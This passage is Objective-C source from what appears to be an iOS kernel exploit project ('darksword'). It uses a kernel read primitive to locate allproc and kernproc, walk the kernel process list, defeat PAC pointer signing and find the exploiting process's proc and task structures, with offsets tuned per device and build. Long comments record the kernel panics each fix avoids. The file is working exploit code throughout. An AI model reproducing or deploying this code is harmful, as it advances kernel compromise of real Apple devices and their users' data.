//
//  utils.m — from rooootdev/lara with DYNAMIC OFFSET DISCOVERY
//
//  Original: ruter (rooootdev), 25.03.26
//  Modified: dynamic proc_name, pid, and task offset discovery
//            to fix 3 critical bugs on iPad8,9
//
//  BUG 1 FIX: PROC_NAME_OFFSET is discovered dynamically instead of 0x56c
//  BUG 2 FIX: vm_map offset discovered in kfs.m (already handled there)
//  BUG 3 FIX: ourtask() uses proc_ro→task path with fallback to scan
//

#import "utils.h"
#import "darksword_core.h"
#include "filelog.h"

#import <Foundation/Foundation.h>
#import <stdio.h>
#import <stdlib.h>
#import <unistd.h>
#import <string.h>
#import <sys/types.h>
#include <sys/sysctl.h>
/* libproc.h is not available in the public iPhoneOS SDK; proc_name() is a
 * private BSD symbol — forward-declare it to avoid the missing header. */
extern int proc_name(int pid, void *buf, uint32_t bufsize);

/* Route utils/allproc/ourproc logs through the shared exploit logger so they
 * appear both in filelog and in the standalone app's on-screen UI log. */
#define filelog_write ds_logf

/* ================================================================
   Offsets — discovered at runtime
   ================================================================ */

/* Bug #449: upstream wh1te4ever/darksword-kexploit-fun offsets.m confirms
 * off_proc_p_pid = 0x60 for ALL iOS 17.x, 18.x, 26.x on all devices (A12/A13+).
 * Previous default of 0 caused build_pid_offset_candidates() to return {0, 0xd8}
 * — both wrong — making the socket/tro fast path AND the Bug #337+448 recovery
 * both fail to validate PID. Initializing to 0x60 immediately makes them work. */
uint32_t PROC_PID_OFFSET = 0x60;
static uint32_t PROC_NAME_OFFSET = 0;
/* XNU xnu-10002 proc struct: p_uid at +0x2C, p_gid at +0x30 */
static const uint32_t PROC_UID_OFFSET  = 0x2C;
static const uint32_t PROC_GID_OFFSET  = 0x30;
static uint32_t PROC_LIST_OFFSET = 0;
/* Bug #232: ipsw_analysis confirms LIST_ENTRY layout:
 *   le_next at +0x00, le_prev at +0x08 within LIST_ENTRY.
 *   p_list is at offset 0x00 in struct proc.
 * So: proc+0x00 = le_next (next proc), proc+0x08 = le_prev. */
static uint32_t PROC_NEXT_OFFSET = 0x00;  /* Bug #232: le_next=0x00 confirmed by ipsw */
static uint32_t PROC_PREV_OFFSET = 0x08;  /* Bug #232: le_prev=0x08 confirmed by ipsw */
static uint64_t g_kernproc_addr = 0;

/* Bug #239b: flag set by validate_direct_allproc_v2 when layout is confirmed
 * via le_prev backlink.  When true, ourproc() skips discover_proc_list_layout
 * (which has a structural bug: base+off+next_ff always reads *(raw+next_ff)
 * regardless of off, so it cannot discover list_off when *(allproc) = proc_base). */
static bool g_direct_layout_set = false;

/* Bug #255: set when we detected a kernproc variable (→ kernel_task, PID 0)
 * instead of allproc.  kernel_task is at the TAIL of allproc's BSD LIST,
 * so forward walk yields only 1 entry.  ourproc() must backward-walk via
 * BSD le_prev at proc+0x08 instead of SMRQ (which is singly-linked). */
static bool g_kernproc_is_pid0 = false;

/* Bug #265B: Blacklist for direct candidates that were invalidated by
 * Bug #263F (DATA array with all PID=0). On retry, these are skipped. */
#define MAX_BLACKLISTED_CANDIDATES 8
static uint64_t g_blacklisted_candidates[MAX_BLACKLISTED_CANDIDATES];
static int g_blacklisted_count = 0;
static int g_ourproc_retry_depth = 0;

static bool is_candidate_blacklisted(uint64_t candidate) {
    if (!candidate) return false;
    for (int i = 0; i < g_blacklisted_count; i++) {
        if (g_blacklisted_candidates[i] == candidate) {
            return true;
        }
    }
    return false;
}

static bool add_candidate_blacklist(uint64_t candidate) {
    if (!candidate || is_candidate_blacklisted(candidate) ||
        g_blacklisted_count >= MAX_BLACKLISTED_CANDIDATES) {
        return false;
    }
    g_blacklisted_candidates[g_blacklisted_count++] = candidate;
    return true;
}

/* Bug #430: blacklist false allproc heads that already failed deep layout
 * discovery. Session 25d showed the same dangerous zone head
 * 0xffffffe4559f6000 being revalidated via direct shortlist, XPF-lite and
 * later DATA scan. Replaying deep layout/full-chain probes on the same false
 * head increases the chance of wandering into per-CPU zone allocations and
 * panicking. Keep a tiny denylist of failed heads for the current run. */
#define MAX_FAILED_ALLPROC_HEADS 8
static uint64_t g_failed_allproc_heads[MAX_FAILED_ALLPROC_HEADS];
static int g_failed_allproc_head_count = 0;
static int g_last_disc_pl_score = 0;

static bool is_failed_allproc_head(uint64_t head) {
    if (!head) return false;
    for (int i = 0; i < g_failed_allproc_head_count; i++) {
        if (g_failed_allproc_heads[i] == head) {
            return true;
        }
    }
    return false;
}

static bool add_failed_allproc_head(uint64_t head) {
    if (!head || is_failed_allproc_head(head) ||
        g_failed_allproc_head_count >= MAX_FAILED_ALLPROC_HEADS) {
        return false;
    }
    g_failed_allproc_heads[g_failed_allproc_head_count++] = head;
    return true;
}

/* Verbosity control for validate_allproc during bulk scans */
static int g_validate_verbose_count = 0;
static bool g_validate_curated = false;

/* proc_ro offsets (iOS 15.2+) */
#define O_PROC_RO       0x18
#define O_PROC_RO_TASK  0x08

static bool g_offsets_ready = false;

static bool get_os_build(char *out, size_t out_len) {
    if (!out || out_len < 2) return false;
    out[0] = '\0';
    size_t len = out_len;
    if (sysctlbyname("kern.osversion", out, &len, NULL, 0) != 0 || len == 0) {
        return false;
    }
    out[out_len - 1] = '\0';
    return true;
}

static bool ds_build_is_21D61(void) {
    static int s_cached = -1;
    if (s_cached == -1) {
        char build[32] = {0};
        s_cached = (get_os_build(build, sizeof(build)) && strcmp(build, "21D61") == 0) ? 1 : 0;
    }
    return s_cached == 1;
}

static bool ds_allow_kernproc_direct(void) {
    const char *enable = getenv("DS_ENABLE_KERNPROC_DIRECT");
    if (enable && enable[0] == '0') return false;
    if (enable && enable[0] == '1') return true;
    /* Bug #436: Bug #422 disabled kernproc-direct by default on 21D61 when the
     * path was still too permissive. After Bug #268/#303/#308/#317/#372 the
     * detector now requires structural head checks plus visible forward/backward
     * chain proof before accepting a candidate. Latest 21D61 run shows the best
     * direct shortlist candidate is repeatedly skipped ONLY by Bug #422 while all
     * other allproc strategies exhaust cleanly. Re-enable this hardened path by
     * default, but keep DS_ENABLE_KERNPROC_DIRECT=0 as an emergency opt-out. */
    return true;
}

static inline void ds_begin_proc_read_scope(void) {
    ds_enter_proc_read_scope();
}

static inline void ds_end_proc_read_scope(void) {
    ds_leave_proc_read_scope();
}

static inline uint64_t ds_finish_ourproc_scope(uint64_t value) {
    ds_end_proc_read_scope();
    return value;
}

/* ================================================================
   init_offsets: PID offset based on iOS version
   ================================================================ */

void init_offsets(void) {
    char ios[256];
    memset(ios, 0, sizeof(ios));
    size_t size = sizeof(ios);
    int sysret = sysctlbyname("kern.osproductversion", ios, &size, NULL, 0);

    int major = 0, minor = 0, patch = 0;
    if (sysret == 0 && size > 0) {
        sscanf(ios, "%d.%d.%d", &major, &minor, &patch);
    } else {
        /* sysctlbyname failed — default to iOS 17 (our target) */
        major = 17; minor = 3; patch = 1;
        printf("WARNING: sysctlbyname failed, assuming iOS %d.%d.%d\n", major, minor, patch);
    }

    /* XNU xnu-10002 (iOS 15+) proc struct layout:
     * +0x00: p_list (16 bytes)
     * +0x10: p_pptr (8 bytes)
     * +0x18: p_proc_ro (8 bytes)
     * +0x20: p_ppid (4 bytes)
     * +0x24: p_original_ppid (4 bytes)
     * +0x28: p_pgrpid (4 bytes) ← was incorrectly used as PID!
     * +0x2C: p_uid (4 bytes)
     * +0x30: p_gid (4 bytes)
     * ...
     * +0x50: p_mlock (16 bytes, lck_mtx_t)
    * +0x60: p_pid (4 bytes) ← canonical PID offset in upstream offsets
    * +0xd8: historic DarkSword fallback used by old iOS 17 heuristics
    *
    * Bug #449: upstream darksword-kexploit-fun now uses off_proc_p_pid=0x60
    * for iOS 17.x/18.x. Keep 0xd8 only as an alternate probe, but make 0x60
    * the primary global offset so new fast paths and direct validators start
    * from the canonical struct layout.
     * Before iOS 15 (xnu < 8019), p_pid was at ~0x10.
     */
    if (major >= 15) {
        PROC_PID_OFFSET = 0x60;  /* Bug #449: primary canonical pid offset */
    } else {
        PROC_PID_OFFSET = 0x10;
    }

    /* Bug #388/#449: build-profile pin.
     * For target build 21D61 pin the primary offset to the canonical +0x60.
     * Alternate probes still try +0xd8 where needed, but the global default
     * should no longer force the legacy layout. */
    char build[32] = {0};
    if (get_os_build(build, sizeof(build)) && strcmp(build, "21D61") == 0) {
        PROC_PID_OFFSET = 0x60;
        filelog_write("[offsets] Bug #388: build profile %s -> PROC_PID_OFFSET pinned to 0x%x",
                      build, PROC_PID_OFFSET);
    }

    printf("iOS %d.%d.%d: PROC_PID_OFFSET=0x%x\n", major, minor, patch, PROC_PID_OFFSET);
    g_offsets_ready = true;
}

/* ================================================================
   Dynamic PROC_NAME_OFFSET discovery
   Scans our own proc struct for the executable name
   ================================================================ */

static bool discover_name_offset(uint64_t proc) {
    if (PROC_NAME_OFFSET != 0) return true;

    /* Get our known process name */
    char our_name[256] = {0};
    proc_name(getpid(), our_name, sizeof(our_name));
    if (strlen(our_name) == 0) {
        const char *pn = getprogname();
        if (pn) strncpy(our_name, pn, sizeof(our_name) - 1);
    }
    size_t name_len = strlen(our_name);
    if (name_len == 0 || name_len > 30) return false;

    printf("discover_name_offset: looking for '%s' in proc 0x%llx\n", our_name, proc);

    /* Scan proc struct offsets 0x100-0x700 */
    for (uint32_t off = 0x100; off <= 0x700; off += 0x04) {
        char buf[64] = {0};
        ds_kread(proc + off, buf, 32);
        if (strncmp(buf, our_name, name_len) == 0 && buf[name_len] == '\0') {
            PROC_NAME_OFFSET = off;
            printf("PROC_NAME_OFFSET = 0x%x (discovered) ✓\n", off);
            return true;
        }
    }

    /* Fallback: known offsets for various iOS */
    uint32_t known[] = { 0x56c, 0x490, 0x4A0, 0x381, 0x389, 0x2D9, 0x2E9 };
    for (size_t i = 0; i < sizeof(known)/sizeof(known[0]); i++) {
        char buf[64] = {0};
        ds_kread(proc + known[i], buf, 32);
        if (strncmp(buf, our_name, name_len) == 0 && buf[name_len] == '\0') {
            PROC_NAME_OFFSET = known[i];
            printf("PROC_NAME_OFFSET = 0x%x (fallback) ✓\n", known[i]);
            return true;
        }
    }

    printf("PROC_NAME_OFFSET: NOT FOUND reliably\n");
    return false;
}

/* ================================================================
   kernproc address — DYNAMIC discovery with fallback
   
   BUG FIX: The original code hardcoded allproc at 0xfffffff0079fd9c8
   which only works on ONE specific kernelcache build. On any other
   iOS version, it reads garbage → ourproc() fails → everything breaks.
   
   New approach:
   1. Scan kernel __DATA segment for allproc (linked list of procs)
   2. Validate by checking if linked list contains pid=0 (kernel_task)
   3. Fall back to known offsets for common iOS versions
   ================================================================ */

/* ================================================================
   PAC (Pointer Authentication) helpers
   On arm64e (A12+), kernel pointers carry PAC bits in upper bytes.
   pac_strip() removes the signature to yield a usable kernel VA.
   ================================================================ */
#define T1SZ_BOOT 0x19
#define BIT_(b)    (1ULL << (b))
#define ONES_(x)   (BIT_(x)-1)
#define PTR_MASK_  ONES_(64-T1SZ_BOOT)
#define PAC_MASK__ (~PTR_MASK_)
#define SIGN_(p)   ((p) & BIT_(55))

static inline uint64_t pac_strip(uint64_t p) {
    return SIGN_(p) ? (p | PAC_MASK__) : (p & ~PAC_MASK__);
}

static inline bool is_heap_ptr(uint64_t p) {
    uint64_t stripped = pac_strip(p);
    /* Zone objects (proc, socket PCB, task, etc.) are in the zone map.
     * Zone METADATA and BITMAPS are OUTSIDE the zone map — they may
     * reside on unmapped pages.  Reading from metadata via our exploit
     * primitive causes kernel data abort (translation fault L3 → PANIC).
     *
     * Zone map position varies per boot (zone KASLR):
     *   Boot A: zone_map 0xffffffdc..0xffffffe2, metadata at 0xffffffe2 (ABOVE)
     *   Boot B: metadata at 0xffffffdc, zone_map 0xffffffde..0xffffffe4 (BELOW)
     *
     * Static bounds CANNOT distinguish objects from metadata across boots.
     * → Use DYNAMIC bounds from ds_get_zone_map_min/max() discovered at runtime.
     *
     * Upper bound: always < 0xfffffff000000000 (kernel text starts there).
     * Fallback: if zone discovery hasn't run, use conservative static bound.
     *
     * ALIGNMENT CHECK: XNU uses bit0=1 as a tag bit in some data structures
     * (e.g. proc_ro pointers).  Such tagged values fall numerically inside
     * zone_map but point to unallocated/unmapped zone pages.  When copyout()
     * validates a zone VA, the kernel reads Zone Metadata for that address —
     * if the page was never allocated, the metadata page is NOT MAPPED, causing
     * a translation-fault L3 kernel panic (ESR 0x96000007, FAR in Zone Metadata).
     * Zone objects are at minimum 8-byte aligned on 64-bit ARM.
     * Reject any pointer with lower 3 bits set to prevent this crash. */
    if (stripped & 7) return false;          /* must be 8-byte aligned */
    if (stripped >= 0xfffffff000000000ULL) return false;

    /* Bug #225: use zone_safe_min to skip VM+RO submaps (per-CPU allocs).
     * Reading per-CPU zone elements via copyout() triggers kernel panic:
     *   "zone bound checks: address X is a per-cpu allocation"
     * Zone objects (proc, socket, task) live in GEN0+ submaps which start
     * at zone_map_min + ~20%.  safe_min = zone_map_min + 25% of span. */
    uint64_t zsafe = ds_get_zone_safe_min();
    uint64_t zmax  = ds_get_zone_map_max();
    /* Bug #396: exclude top zone tail to avoid per-CPU allocations.
     * Panic evidence (08:23:01) showed a dereference into:
     *   "zone bound checks: address ... is a per-cpu allocation"
     * These addresses can sit near the high end of zone_map and still pass
     * basic heap-range checks. We reserve the top 4MB as no-deref region
     * for speculative proc/allproc pointer validation.
     *
     * Real proc objects observed in our sessions are far below this tail
     * (GEN0/GEN1/GEN2 ranges), so this is a conservative safety cut.
     */
    const uint64_t ZONE_TOP_GUARD = 0x400000ULL; /* 4MB */
    uint64_t ztop_guard = (zmax > ZONE_TOP_GUARD) ? (zmax - ZONE_TOP_GUARD) : zmax;
    if (zsafe && zmax) {
        return (stripped >= zsafe && stripped < ztop_guard);
    }
    /* Fallback: use raw zone_map_min before safe_min is computed */
    uint64_t zmin = ds_get_zone_map_min();
    if (zmin && zmax) {
        return (stripped >= zmin && stripped < ztop_guard);
    }
    /* Fallback before zone discovery: very conservative.
     * This is only used during early exploit before zone bounds are known. */
    return (stripped >= 0xffffffd000000000ULL && stripped < 0xfffffff000000000ULL);
}

/* Bug #227: allproc/proc-chain validation must NOT use g_zone_safe_min.
 * safe_min is a heuristic to skip VM/RO submaps during blind scans, but in
 * session 14 a plausible `next proc` pointer (0xffffffdd33555ed0) was above
 * zone_map_min and below zone_map_max, yet below safe_min. That made
 * discover_proc_list_layout() reject a likely real proc chain.
 *
 * Bug #397 (2026-04-04): Kernel data abort (ESR 0x96000007 = L3 translation
 * fault) triggered when chain-walk dereferenced a zone address whose metadata
 * page was NOT MAPPED. The address (~0xffffffde0b120000, GEN0) was numerically
 * in [zmin,zmax) and 8-byte aligned, so old is_heap_ptr_relaxed allowed it.
 * When copyout() tried to validate zone metadata at 0xffffffdc13b4a280 (the
 * corresponding metadata entry), that metadata PAGE itself was unmapped because
 * the zone page had never been allocated → kernel panic.
 *
 * Fix: use zone_safe_min (zmin + 25% of span) as the lower bound in relaxed
 * mode too. zone_safe_min skips the sparsely-allocated lower GEN0 region where
 * pages are rarely backed. Real proc objects (proc0, launchd, DarkSword) live in
 * GEN3/DATA ranges which are far above zone_safe_min on A12Z iOS 17.3.1.
 *
 * If a future session has a valid proc below zone_safe_min (Bug #227 scenario),
 * fallback to raw zmin is available via the raw-zmin path in validate_kernproc_
 * backward_chain / probe_kernproc_backward_pid_offset_for_ourpid. */
static inline bool is_heap_ptr_relaxed(uint64_t p) {
    uint64_t stripped = pac_strip(p);
    if (stripped & 7) return false;
    if (stripped >= 0xfffffff000000000ULL) return false;

    uint64_t zsafe = ds_get_zone_safe_min();
    uint64_t zmax  = ds_get_zone_map_max();
    if (zsafe && zmax) {
        return (stripped >= zsafe && stripped < zmax);
    }
    /* Fallback: zone_safe_min not yet computed — use raw zone_map_min.
     * This only fires during early exploit before zone discovery completes. */
    uint64_t zmin = ds_get_zone_map_min();
    if (zmin && zmax) {
        return (stripped >= zmin && stripped < zmax);
    }
    return (stripped >= 0xffffffd000000000ULL && stripped < 0xfffffff000000000ULL);
}

/* Bug #403: raw zone-map range check — uses zone_map_min instead of zone_safe_min.
 * Intended for forward/backward proc-chain walks that start from a CONFIRMED kernproc
 * entry (le_prev backref verified).  Early-boot kernel thread proc structs are allocated
 * in the low GEN0 region of zone_map, below zone_safe_min.  Using is_heap_ptr_relaxed
 * there causes the walk to abort after ~11 kernel threads, preventing ourpid discovery.
 *
 * This variant still applies:
 *   - 8-byte alignment check (mandatory)
 *   - kernel-text exclusion (>= 0xfffffff000000000)
 *   - ZONE_TOP_GUARD (4 MB) to avoid per-CPU allocation tail
 * It does NOT apply the zone_safe_min heuristic — only use when the starting proc
 * is already proven valid.  All kreads downstream are via kread*_checked_local so
 * a bad address terminates the walk safely without panic. */
static inline bool is_in_zone_map(uint64_t p) {
    uint64_t stripped = pac_strip(p);
    if (stripped & 7) return false;
    if (stripped >= 0xfffffff000000000ULL) return false;
    uint64_t zmin = ds_get_zone_map_min();
    uint64_t zmax = ds_get_zone_map_max();
    if (zmin && zmax) {
        const uint64_t ZONE_TOP_GUARD = 0x400000ULL;
        uint64_t ztop = (zmax > ZONE_TOP_GUARD) ? (zmax - ZONE_TOP_GUARD) : zmax;
        return (stripped >= zmin && stripped < ztop);
    }
    return (stripped >= 0xffffffd000000000ULL && stripped < 0xfffffff000000000ULL);
}

static inline bool is_kernel_data_ptr(uint64_t p);

/* Bug #404: unified pointer predicate for proc-chain walks.
 * For confirmed/near-confirmed proc walks we must allow:
 *  - relaxed heap pointers (zone_safe_min..)
 *  - low zone_map pointers below zone_safe_min (kthread-heavy prefix)
 *  - kernel DATA proc entries when direct layout is enabled
 */
static inline bool is_proc_chain_ptr(uint64_t p) {
    return is_heap_ptr_relaxed(p) || is_in_zone_map(p) || (g_direct_layout_set && is_kernel_data_ptr(p));
}

static inline bool is_plausible_pid(uint32_t pid) {
    return pid <= 0x100000;
}

static inline bool is_poisoned_proc_link_ptr(uint64_t p) {
    return p == 0 || p == 0xffffffffffffffffULL;
}

static inline uint64_t sanitize_proc_link_ptr(uint64_t raw_ptr) {
    uint64_t stripped = pac_strip(raw_ptr);
    return is_poisoned_proc_link_ptr(stripped) ? 0 : stripped;
}

static inline uint64_t fallback_proc_link_target(uint64_t raw_target) {
    uint64_t stripped = sanitize_proc_link_ptr(raw_target);
    if (!stripped) return 0;
    return is_proc_chain_ptr(stripped) ? stripped : 0;
}

static inline bool kread64_checked_local(uint64_t addr, uint64_t *out) {
    return ds_kread64_checked(addr, out);
}

static inline bool kread32_checked_local(uint64_t addr, uint32_t *out) {
    return ds_kread32_checked(addr, out);
}

static bool kread_proc_name_bounded(uint64_t proc_base, uint32_t name_off, char *out, size_t out_sz) {
    if (!out || out_sz < 2) return false;
    out[0] = '\0';

    if (name_off >= 0x1000) return false;

    uint64_t addr = proc_base + name_off;
    size_t in_page = (size_t)(0x1000ULL - (addr & 0xFFFULL));
    if (in_page == 0) return false;

    size_t read_len = out_sz - 1;
    if (read_len > in_page) read_len = in_page;
    if (read_len > 31) read_len = 31;
    if (read_len < 4) return false;

    if (!ds_kread_checked(addr, out, (uint64_t)read_len)) return false;
    out[out_sz - 1] = '\0';
    return true;
}

static bool get_our_process_name(char *out, size_t out_sz) {
    if (!out || out_sz < 2) return false;
    out[0] = '\0';
    proc_name(getpid(), out, (uint32_t)out_sz);
    if (out[0] != '\0') return true;
    const char *pn = getprogname();
    if (!pn || !pn[0]) return false;
    strlcpy(out, pn, out_sz);
    return out[0] != '\0';
}

static bool scan_proc_name_for_ours(uint64_t proc_base, uint32_t *found_off) {
    char ours[64] = {0};
    if (found_off) *found_off = 0;
    if (!get_our_process_name(ours, sizeof(ours))) return false;

    size_t name_len = strlen(ours);
    if (name_len == 0 || name_len > 31) return false;

    for (uint32_t off = 0x100; off <= 0x700; off += 4) {
        char cand[64] = {0};
        if (!kread_proc_name_bounded(proc_base, off, cand, sizeof(cand))) continue;
        if (cand[0] != '\0' && strcmp(cand, ours) == 0) {
            if (found_off) *found_off = off;
            return true;
        }
    }
    return false;
}

/* Forward declarations — defined later, needed by proc helpers / normalize */
static bool is_kptr(uint64_t p);
static inline bool is_kernel_data_ptr(uint64_t p);

static bool proc_name_matches_ours(uint64_t proc_base) {
    char ours[64] = {0};
    char cand[64] = {0};
    if (!get_our_process_name(ours, sizeof(ours))) return false;

    if (PROC_NAME_OFFSET &&
        kread_proc_name_bounded(proc_base, PROC_NAME_OFFSET, cand, sizeof(cand)) &&
        cand[0] != '\0' && strcmp(ours, cand) == 0) {
        return true;
    }

    uint32_t found_off = 0;
    if (scan_proc_name_for_ours(proc_base, &found_off)) {
        if (!PROC_NAME_OFFSET && found_off) {
            PROC_NAME_OFFSET = found_off;
            filelog_write("[ourproc] Bug #390: discovered PROC_NAME_OFFSET=0x%x from candidate 0x%llx",
                          found_off, proc_base);
        }
        return true;
    }
    return false;
}

static bool proc_credentials_match_ours(uint64_t proc_base, bool *uid_ok_out, bool *gid_ok_out) {
    uint32_t kuid = 0, kgid = 0;
    bool uid_ok = ds_kread32_checked(proc_base + PROC_UID_OFFSET, &kuid) &&
                  kuid == (uint32_t)getuid();
    bool gid_ok = ds_kread32_checked(proc_base + PROC_GID_OFFSET, &kgid) &&
                  kgid == (uint32_t)getgid();
    if (uid_ok_out) *uid_ok_out = uid_ok;
    if (gid_ok_out) *gid_ok_out = gid_ok;
    return uid_ok && gid_ok;
}

static bool task_has_vm_map_sanity(uint64_t task) {
    if (!(is_heap_ptr(task) || is_kptr(task))) return false;

    for (uint32_t map_off = 0x20; map_off <= 0x100; map_off += 0x08) {
        uint64_t vm_map_raw = 0;
        if (!ds_kread64_checked(task + map_off, &vm_map_raw)) continue;
        uint64_t vm_map = pac_strip(vm_map_raw);
        if (!(is_heap_ptr(vm_map) || is_kptr(vm_map))) continue;

        uint32_t nentries = 0;
        if (!ds_kread32_checked(vm_map + 0x10 + 0x20, &nentries)) continue;
        if (nentries > 10 && nentries < 10000) {
            return true;
        }
    }
    return false;
}

static bool proc_has_task_proof(uint64_t proc_base) {
    uint64_t proc_ro_raw = 0, proc_ro = 0, ro_task_raw = 0, ro_task = 0;
    if (!ds_kread64_checked(proc_base + O_PROC_RO, &proc_ro_raw)) return false;
    proc_ro = pac_strip(proc_ro_raw);
    if (!is_kptr(proc_ro)) return false;
    if (!ds_kread64_checked(proc_ro + O_PROC_RO_TASK, &ro_task_raw)) return false;
    ro_task = pac_strip(ro_task_raw);
    return is_kptr(ro_task);
}

static void add_unique_proc_candidate(uint64_t *arr, int *count, int cap, uint64_t proc_base) {
    if (!arr || !count || cap <= 0 || !proc_base) return;
    if (!(is_heap_ptr_relaxed(proc_base) || is_kernel_data_ptr(proc_base))) return;
    for (int i = 0; i < *count; i++) {
        if (arr[i] == proc_base) return;
    }
    if (*count < cap) arr[(*count)++] = proc_base;
}

static uint64_t normalize_proc_link_target_with_pid(uint64_t raw_target, uint32_t list_off, uint32_t pid_off) {
    uint64_t stripped = sanitize_proc_link_ptr(raw_target);
    if (!stripped) return 0;

    /* Bug #240: iOS 17 uses SMRQ-style lists where le_next / smrq_next
     * points to the LIST_ENTRY field (proc_base + list_off), NOT to
     * proc_base.  When list_off > 0, try (stripped - list_off) FIRST
     * to resolve the correct proc_base.  Previously, stripped (the raw
     * list_entry pointer) was tried first — if a random field at
     * list_entry + pid_off coincidentally passed is_plausible_pid, the
     * WRONG base was returned, causing the walk to jump off-track and
     * miss procs (including our PID 362 in session 25d). */
    uint64_t candidates[2];
    size_t count = 0;
    if (list_off > 0 && stripped >= list_off) {
        candidates[count++] = stripped - list_off;  /* SMRQ: proc_base = entry - list_off */
    }
    candidates[count++] = stripped;                  /* BSD / list_off==0: entry IS proc_base */

    for (size_t i = 0; i < count; i++) {
        uint64_t cand = candidates[i];
        /* Bug #261A: Accept kernel DATA pointers when direct layout is confirmed.
         * On iOS 17, proc0 AND adjacent procs can reside in kernel __DATA
         * (kbase..kbase+0x4000000). The heap check rejects these valid procs.
         * Bug #403: also accept full zone_map range (is_in_zone_map) so that
         * early-boot kthread structs below zone_safe_min pass normalization. */
        bool ptr_ok = is_heap_ptr_relaxed(cand) || is_in_zone_map(cand);
        if (!ptr_ok && g_direct_layout_set && is_kernel_data_ptr(cand)) {
            ptr_ok = true;
        }
        if (!ptr_ok) continue;

        uint32_t pid = 0;
        if (!kread32_checked_local(cand + pid_off, &pid)) continue;
        if (is_plausible_pid(pid)) return cand;
    }

    return 0;
}

static inline bool proc_list_next_checked_pid(uint64_t proc, uint32_t list_off, uint32_t pid_off, uint64_t *next_out) {
    uint64_t raw = 0;
    if (!kread64_checked_local(proc + list_off + PROC_NEXT_OFFSET, &raw)) return false;
    uint64_t next = normalize_proc_link_target_with_pid(raw, list_off, pid_off);
    if (!next) next = fallback_proc_link_target(raw);
    if (next_out) *next_out = next;
    return true;
}

static inline bool proc_list_next_checked(uint64_t proc, uint32_t list_off, uint64_t *next_out) {
    return proc_list_next_checked_pid(proc, list_off, PROC_PID_OFFSET, next_out);
}

static inline uint64_t proc_list_next(uint64_t proc, uint32_t list_off) {
    uint64_t next = 0;
    (void)proc_list_next_checked(proc, list_off, &next);
    return next;
}

static inline uint64_t proc_list_prev(uint64_t proc, uint32_t list_off) {
    uint64_t raw = 0;
    if (!kread64_checked_local(proc + list_off + PROC_PREV_OFFSET, &raw)) return 0;
    uint64_t prev = normalize_proc_link_target_with_pid(raw, list_off, PROC_PID_OFFSET);
    return prev ? prev : fallback_proc_link_target(raw);
}

static bool validate_proc_chain_with_pid_off(uint64_t firstproc, uint32_t list_off, uint32_t pid_off, int max_steps) {
    bool found_pid0 = false;
    bool found_pid1 = false;
    int seen = 0;
    int unique_pids = 0;
    int zero_pid_count = 0;
    uint64_t cur = firstproc;
    /* Bug #233: cycle detection — circular sublists must be rejected */
    uint64_t visited[64];
    int nvisited = 0;
    uint32_t pid_seen[64];
    int npid_seen = 0;
    bool saw_cycle = false;

    for (int i = 0; i < max_steps && is_proc_chain_ptr(cur); i++) {
        /* Check for cycle */
        for (int v = 0; v < nvisited; v++) {
            if (visited[v] == cur) {
                /* Bug #382: the stricter post-discovery validator used to reject any
                 * revisit immediately, but fresh session 25i showed a DATA-scan head
                 * that already passed layout discovery with score=25 and then still
                 * died here before kernprocaddress() could accept it. For these heads
                 * a cycle or loop-back after sufficient PID diversity is evidence of a
                 * bounded proc queue/list head, not necessarily a false positive.
                 * Stop the walk and evaluate the collected PID diversity instead of
                 * hard-failing before the summary thresholds run. */
                saw_cycle = true;
                goto chain_done;
            }
        }
        if (nvisited < 64) visited[nvisited++] = cur;

        uint32_t pid = 0;
        if (!kread32_checked_local(cur + pid_off, &pid)) return false;
        if (!is_plausible_pid(pid)) return false;

        if (pid == 0) found_pid0 = true;
        if (pid == 1) found_pid1 = true;
        if (pid == 0) zero_pid_count++;
        bool seen_before = false;
        for (int p = 0; p < npid_seen; p++) {
            if (pid_seen[p] == pid) {
                seen_before = true;
                break;
            }
        }
        if (!seen_before) {
            if (npid_seen < 64) pid_seen[npid_seen++] = pid;
            unique_pids++;
        }
        seen++;

        uint64_t next = 0;
        if (!proc_list_next_checked_pid(cur, list_off, pid_off, &next)) return false;
        if (next == 0) break;
        if (!is_proc_chain_ptr(next) || next == cur) return false;
        cur = next;
    }

chain_done:

    /* Bug #235: Session 22 showed that some non-allproc lists can still yield
     * 20 unique proc-looking nodes while reusing only a tiny PID set such as
     * {0,5,9}. Reject such lists by requiring meaningful PID diversity. */
    if (saw_cycle && seen >= 20 && unique_pids >= 8 && zero_pid_count <= 2) {
        filelog_write("[allproc] Bug #382: accepting cyclic/looped proc chain after strong diversity "
                      "(seen=%d unique=%d zero=%d pid_off=0x%x list_off=0x%x next_off=0x%x)",
                      seen, unique_pids, zero_pid_count, pid_off, list_off, PROC_NEXT_OFFSET);
    }
    return seen >= 20 && unique_pids >= 8 && zero_pid_count <= 2;
}

static bool validate_proc_chain(uint64_t firstproc, uint32_t list_off, int max_steps) {
    return validate_proc_chain_with_pid_off(firstproc, list_off, PROC_PID_OFFSET, max_steps);
}

static size_t build_pid_offset_candidates(uint32_t *out, size_t cap);

/* Bug #390: reject mixed-head false positives where legacy disc_pl picks a
 * non-zero interior list_off (for example 0xb0), but the candidate's first
 * proc still looks like a BSD allproc head at +0x00/+0x08.
 *
 * Fresh runtime after Bug #389 showed exactly this shape at kbase+0x321C480:
 *   - disc_pl selected list_off=0xb0 and forward walk yielded only pid<=215
 *   - the same proc had p_list.le_prev == allproc and p_list.le_next == heap
 *   - selected entry's "prev" field was 0x10, i.e. clearly not a kptr
 * That means phase2 latched onto an interior proc sublist (likely p_pglist /
 * similar) while the real BSD head proof at +0x00 remained non-user-visible.
 * Treat such mixed heads as false positives and force resolver fallback. */
static bool reject_mixed_bsd_head_candidate(uint64_t allproc_addr, uint64_t firstproc) {
    if (!allproc_addr || !firstproc || PROC_LIST_OFFSET == 0) return false;
    if (!is_heap_ptr_relaxed(firstproc)) return false;

    uint64_t bsd_next_raw = 0, bsd_prev_raw = 0;
    if (!kread64_checked_local(firstproc + 0x00, &bsd_next_raw) ||
        !kread64_checked_local(firstproc + 0x08, &bsd_prev_raw)) {
        return false;
    }

    uint64_t bsd_next = pac_strip(bsd_next_raw);
    uint64_t bsd_prev = pac_strip(bsd_prev_raw);
    bool bsd_head_shape = (bsd_prev == allproc_addr) && is_heap_ptr_relaxed(bsd_next);
    if (!bsd_head_shape) return false;

    uint64_t chosen_prev_raw = 0;
    if (!kread64_checked_local(firstproc + PROC_LIST_OFFSET + 0x08, &chosen_prev_raw)) {
        return false;
    }
    uint64_t chosen_prev = pac_strip(chosen_prev_raw);

    if (!chosen_prev || is_kptr(chosen_prev)) {
        return false;
    }

    uint32_t pid_probe_offs[4] = {0};
    size_t pid_probe_count = build_pid_offset_candidates(pid_probe_offs, 4);
    bool bsd_chain_ok = false;
